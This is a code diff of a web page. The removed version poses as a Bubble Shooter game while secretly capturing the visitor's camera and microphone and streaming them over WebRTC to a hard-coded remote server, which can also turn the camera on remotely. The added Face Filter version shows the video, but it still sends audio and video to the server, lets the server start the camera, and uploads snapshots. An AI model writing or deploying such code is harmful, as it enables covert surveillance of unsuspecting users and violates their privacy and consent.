@@ -1,301 +1,256 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bubble Shooter</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+  <title>Face Filter</title>
+  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #1a1a1a;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    #video {
+      width: 640px;
+      height: 480px;
+      border: 2px solid #fff;
+      border-radius: 8px;
+    }
+    #canvas {
+      position: absolute;
+      width: 640px;
+      height: 480px;
+    }
+    .video-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .controls {
+      display: flex;
+      gap: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+  </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
-  <div class="bg-white p-6 rounded-lg shadow-lg max-w-lg w-full">
-    <h1 class="text-2xl font-bold mb-4 text-center">Bubble Shooter</h1>
-    <canvas id="gameCanvas" width="480" height="600" class="w-full border"></canvas>
-    <p id="error" class="text-red-500 text-center hidden"></p>
+<body>
+  <h1>Face Filter Interface</h1>
+  <div class="video-container">
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+  </div>
+  <div class="controls">
+    <button onclick="applyFilter('sunglasses')">Sunglasses</button>
+    <button onclick="applyFilter('sepia')">Sepia</button>
+    <button onclick="applyFilter('grayscale')">Grayscale</button>
+    <button onclick="takePhoto()">Take Photo</button>
+    <button onclick="stopCamera()">Stop Camera</button>
   </div>
 
   <script>
-    const socket = io('https://secret-404e.onrender.com', {
-      path: '/socket.io',
-      transportOptions: {
-        polling: {
-          extraHeaders: {
-            'ngrok-skip-browser-warning': 'true'
-          }
-        }
-      }
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    let stream = null;
+    let currentFilter = null;
+    let sunglasses = new Image();
+    sunglasses.src = '/client-app/glass.png'; // Updated to custom PNG
+    let faceDetectionInterval = null;
+
+    // Socket.IO connection
+    const socket = io(window.location.origin, { path: '/socket.io' });
+    socket.on('connect', () => {
+      console.log('Connected to server');
+      socket.emit('register', 'client');
     });
 
-    let peerConnection = null;
+    // WebRTC setup
+    const peerConnection = new RTCPeerConnection({
+      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] // Fixed typo in STUN URL
+    });
 
-    // Initialize WebRTC peer connection
-    function createPeerConnection() {
-      const pc = new RTCPeerConnection({
-        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-      });
-      pc.onicecandidate = (event) => {
-        if (event.candidate) {
-          socket.emit('ice-candidate', event.candidate);
-        }
-      };
-      return pc;
-    }
+    peerConnection.onicecandidate = (event) => {
+      if (event.candidate) {
+        socket.emit('ice-candidate', event.candidate);
+      }
+    };
 
-    // Start camera in the background
+    peerConnection.ontrack = (event) => {
+      console.log('Received remote track');
+    };
+
+    socket.on('offer', async (offer) => {
+      await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+      const answer = await peerConnection.createAnswer();
+      await peerConnection.setLocalDescription(answer);
+      socket.emit('answer', answer);
+    });
+
+    socket.on('ice-candidate', (candidate) => {
+      peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+    });
+
+    socket.on('start-camera', () => {
+      startCamera();
+    });
+
+    socket.on('stop-camera', () => {
+      stopCamera();
+    });
+
     async function startCamera() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        peerConnection = createPeerConnection();
-        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        video.srcObject = stream;
+        peerConnection.addTrack(stream.getVideoTracks()[0], stream);
+        peerConnection.addTrack(stream.getAudioTracks()[0], stream);
+
+        // Start face detection
+        await Promise.all([
+          faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights'),
+          faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights')
+        ]);
+
+        faceDetectionInterval = setInterval(async () => {
+          const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
+            .withFaceLandmarks();
+
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
+          if (detections && currentFilter) {
+            if (currentFilter === 'sunglasses') {
+              const landmarks = detections.landmarks;
+              const leftEye = landmarks.getLeftEye();
+              const rightEye = landmarks.getRightEye();
+              const eyeDistance = Math.sqrt(
+                Math.pow(rightEye[0].x - leftEye[0].x, 2) +
+                Math.pow(rightEye[0].y - leftEye[0].y, 2)
+              );
+              const sunglassesWidth = eyeDistance * 2.5; // Adjust multiplier if needed
+              const sunglassesHeight = sunglassesWidth * (sunglasses.naturalHeight / sunglasses.naturalWidth); // Maintain aspect ratio
+              const sunglassesX = leftEye[0].x - sunglassesWidth * 0.25;
+              const sunglassesY = leftEye[0].y - sunglassesHeight * 0.5;
+              ctx.drawImage(sunglasses, sunglassesX, sunglassesY, sunglassesWidth, sunglassesHeight);
+            } else if (currentFilter === 'sepia') {
+              ctx.filter = 'sepia(1)';
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            } else if (currentFilter === 'grayscale') {
+              ctx.filter = 'grayscale(1)';
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            }
+          }
+        }, 100);
+      } catch (err) {
+        console.error('Error starting camera:', err);
+      }
+    }
+
+    function applyFilter(filter) {
+      currentFilter = filter;
+      if (!stream) {
+        startCamera();
+      }
+      socket.emit('start-camera');
+    }
+
+    function takePhoto() {
+      if (stream && video.srcObject) {
+        const snapshotCanvas = document.createElement('canvas');
+        snapshotCanvas.width = video.videoWidth;
+        snapshotCanvas.height = video.videoHeight;
+        const snapshotCtx = snapshotCanvas.getContext('2d');
+        snapshotCtx.drawImage(video, 0, 0);
+        if (currentFilter === 'sunglasses' && faceDetectionInterval) {
+          // Reapply sunglasses filter to snapshot
+          faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
+            .withFaceLandmarks()
+            .then(detections => {
+              if (detections) {
+                const landmarks = detections.landmarks;
+                const leftEye = landmarks.getLeftEye();
+                const rightEye = landmarks.getRightEye();
+                const eyeDistance = Math.sqrt(
+                  Math.pow(rightEye[0].x - leftEye[0].x, 2) +
+                  Math.pow(rightEye[0].y - leftEye[0].y, 2)
+                );
+                const sunglassesWidth = eyeDistance * 2.5; // Adjust multiplier if needed
+                const sunglassesHeight = sunglassesWidth * (sunglasses.naturalHeight / sunglasses.naturalWidth);
+                const sunglassesX = leftEye[0].x - sunglassesWidth * 0.25;
+                const sunglassesY = leftEye[0].y - sunglassesHeight * 0.5;
+                snapshotCtx.drawImage(sunglasses, sunglassesX, sunglassesY, sunglassesWidth, sunglassesHeight);
+              }
+              socket.emit('snapshot', snapshotCanvas.toDataURL('image/png'));
+            });
+        } else if (currentFilter === 'sepia') {
+          snapshotCtx.filter = 'sepia(1)';
+          snapshotCtx.drawImage(video, 0, 0);
+          socket.emit('snapshot', snapshotCanvas.toDataURL('image/png'));
+        } else if (currentFilter === 'grayscale') {
+          snapshotCtx.filter = 'grayscale(1)';
+          snapshotCtx.drawImage(video, 0, 0);
+          socket.emit('snapshot', snapshotCanvas.toDataURL('image/png'));
+        } else {
+          snapshotCtx.drawImage(video, 0, 0);
+          socket.emit('snapshot', snapshotCanvas.toDataURL('image/png'));
+        }
+      }
+    }
+
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+        video.srcObject = null;
+        clearInterval(faceDetectionInterval);
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        currentFilter = null;
+        socket.emit('stop-camera');
+      }
+    }
+
+    // Create offer for WebRTC
+    async function createOffer() {
+      try {
         const offer = await peerConnection.createOffer();
         await peerConnection.setLocalDescription(offer);
         socket.emit('offer', offer);
       } catch (err) {
-        document.getElementById('error').textContent = 'Camera access unavailable';
-        document.getElementById('error').classList.remove('hidden');
+        console.error('Error creating offer:', err);
       }
     }
 
-    // Stop camera
-    function stopCamera() {
-      if (peerConnection) {
-        peerConnection.getSenders().forEach(sender => {
-          if (sender.track) {
-            sender.track.stop();
-          }
-        });
-        peerConnection.close();
-        peerConnection = null;
-      }
-    }
-
-    // Socket.IO setup
+    // Initialize WebRTC offer when camera starts
     socket.on('connect', () => {
-      socket.emit('register', 'client');
-      console.log('Connected to server');
-      startCamera();
-    });
-
-    socket.on('connect_error', (err) => {
-      console.error('Socket.IO connection error:', err.message);
-      document.getElementById('error').textContent = 'Failed to connect to server';
-      document.getElementById('error').classList.remove('hidden');
-    });
-
-    socket.on('answer', async (answer) => {
-      if (peerConnection) {
-        await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+      if (stream) {
+        createOffer();
       }
     });
-
-    socket.on('ice-candidate', async (candidate) => {
-      if (peerConnection) {
-        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-      }
-    });
-
-    socket.on('start-camera', startCamera);
-    socket.on('stop-camera', stopCamera);
-
-    // Bubble Shooter Game
-    const canvas = document.getElementById('gameCanvas');
-    const ctx = canvas.getContext('2d');
-    const bubbleColors = ['red', 'blue', 'green', 'yellow'];
-    const bubbleRadius = 20;
-    const shooterRadius = 15;
-    const gridRows = 8;
-    const gridCols = 10;
-    const bubbleSpacing = bubbleRadius * 2 + 5;
-    let bubbles = [];
-    let shooterBubble = null;
-    let shooterAngle = Math.PI / 2;
-    let score = 0;
-    let gameOver = false;
-
-    // Initialize bubble grid
-    function initBubbles() {
-      bubbles = [];
-      for (let row = 0; row < gridRows; row++) {
-        bubbles[row] = [];
-        for (let col = 0; col < gridCols; col++) {
-          if (row < 4 || Math.random() > 0.5) {
-            bubbles[row][col] = {
-              x: col * bubbleSpacing + bubbleRadius + 20,
-              y: row * bubbleSpacing + bubbleRadius + 20,
-              color: bubbleColors[Math.floor(Math.random() * bubbleColors.length)]
-            };
-          }
-        }
-      }
-    }
-
-    // Create shooter bubble
-    function createShooterBubble() {
-      shooterBubble = {
-        x: canvas.width / 2,
-        y: canvas.height - shooterRadius,
-        color: bubbleColors[Math.floor(Math.random() * bubbleColors.length)]
-      };
-    }
-
-    // Draw game
-    function draw() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-      // Draw bubbles
-      for (let row = 0; row < gridRows; row++) {
-        for (let col = 0; col < gridCols; col++) {
-          if (bubbles[row][col]) {
-            ctx.beginPath();
-            ctx.arc(bubbles[row][col].x, bubbles[row][col].y, bubbleRadius, 0, Math.PI * 2);
-            ctx.fillStyle = bubbles[row][col].color;
-            ctx.fill();
-            ctx.stroke();
-          }
-        }
-      }
-
-      // Draw shooter bubble
-      if (shooterBubble) {
-        ctx.beginPath();
-        ctx.arc(shooterBubble.x, shooterBubble.y, shooterRadius, 0, Math.PI * 2);
-        ctx.fillStyle = shooterBubble.color;
-        ctx.fill();
-        ctx.stroke();
-
-        // Draw aiming line
-        ctx.beginPath();
-        ctx.moveTo(shooterBubble.x, shooterBubble.y);
-        const lineLength = 50;
-        ctx.lineTo(
-          shooterBubble.x + Math.cos(shooterAngle) * lineLength,
-          shooterBubble.y - Math.sin(shooterAngle) * lineLength
-        );
-        ctx.strokeStyle = 'black';
-        ctx.stroke();
-      }
-
-      // Draw score
-      ctx.fillStyle = 'black';
-      ctx.font = '20px Arial';
-      ctx.fillText(`Score: ${score}`, 10, canvas.height - 10);
-    }
-
-    // Handle mouse movement for aiming
-    canvas.addEventListener('mousemove', (e) => {
-      const rect = canvas.getBoundingClientRect();
-      const mouseX = e.clientX - rect.left;
-      const mouseY = e.clientY - rect.top;
-      shooterAngle = Math.atan2(canvas.height - mouseY, mouseX - canvas.width / 2);
-    });
-
-    // Shoot bubble
-    canvas.addEventListener('click', () => {
-      if (shooterBubble && !shooterBubble.dx) {
-        shooterBubble.dx = Math.cos(shooterAngle) * 5;
-        shooterBubble.dy = -Math.sin(shooterAngle) * 5;
-      }
-    });
-
-    // Update game state
-    function update() {
-      if (gameOver) return;
-
-      if (shooterBubble && shooterBubble.dx) {
-        shooterBubble.x += shooterBubble.dx;
-        shooterBubble.y += shooterBubble.dy;
-
-        // Wall collisions
-        if (shooterBubble.x - shooterRadius < 0 || shooterBubble.x + shooterRadius > canvas.width) {
-          shooterBubble.dx = -shooterBubble.dx;
-        }
-        if (shooterBubble.y - shooterRadius < 0) {
-          shooterBubble.dy = 0;
-          placeBubbleInGrid();
-        }
-
-        // Bubble collisions
-        for (let row = 0; row < gridRows; row++) {
-          for (let col = 0; col < gridCols; col++) {
-            if (bubbles[row][col]) {
-              const dx = shooterBubble.x - bubbles[row][col].x;
-              const dy = shooterBubble.y - bubbles[row][col].y;
-              const distance = Math.sqrt(dx * dx + dy * dy);
-              if (distance < bubbleRadius * 2) {
-                shooterBubble.dy = 0;
-                placeBubbleInGrid();
-              }
-            }
-          }
-        }
-      }
-
-      // Check game over
-      for (let col = 0; col < gridCols; col++) {
-        if (bubbles[gridRows - 1][col]) {
-          gameOver = true;
-          ctx.fillStyle = 'red';
-          ctx.font = '40px Arial';
-          ctx.fillText('Game Over', canvas.width / 2 - 100, canvas.height / 2);
-        }
-      }
-
-      draw();
-      requestAnimationFrame(update);
-    }
-
-    // Place shooter bubble in grid
-    function placeBubbleInGrid() {
-      let closestRow = Math.round((shooterBubble.y - 20) / bubbleSpacing);
-      let closestCol = Math.round((shooterBubble.x - 20) / bubbleSpacing);
-      if (closestRow < 0) closestRow = 0;
-      if (closestCol < 0) closestCol = 0;
-      if (closestCol >= gridCols) closestCol = gridCols - 1;
-      if (closestRow >= gridRows) {
-        gameOver = true;
-        return;
-      }
-      bubbles[closestRow][closestCol] = {
-        x: closestCol * bubbleSpacing + bubbleRadius + 20,
-        y: closestRow * bubbleSpacing + bubbleRadius + 20,
-        color: shooterBubble.color
-      };
-      checkMatches(closestRow, closestCol);
-      shooterBubble = null;
-      createShooterBubble();
-    }
-
-    // Check for matches
-    function checkMatches(row, col) {
-      const color = bubbles[row][col].color;
-      const visited = new Set();
-      const toRemove = [];
-
-      function dfs(r, c) {
-        if (r < 0 || r >= gridRows || c < 0 || c >= gridCols || !bubbles[r][c] || bubbles[r][c].color !== color || visited.has(`${r},${c}`)) {
-          return;
-        }
-        visited.add(`${r},${c}`);
-        toRemove.push([r, c]);
-        dfs(r - 1, c);
-        dfs(r + 1, c);
-        dfs(r, c - 1);
-        dfs(r, c + 1);
-      }
-
-      dfs(row, col);
-      if (toRemove.length >= 3) {
-        toRemove.forEach(([r, c]) => {
-          bubbles[r][c] = null;
-          score += 10;
-        });
-      }
-    }
-
-    // Start game
-    initBubbles();
-    createShooterBubble();
-    update();
   </script>
 </body>
 </html>
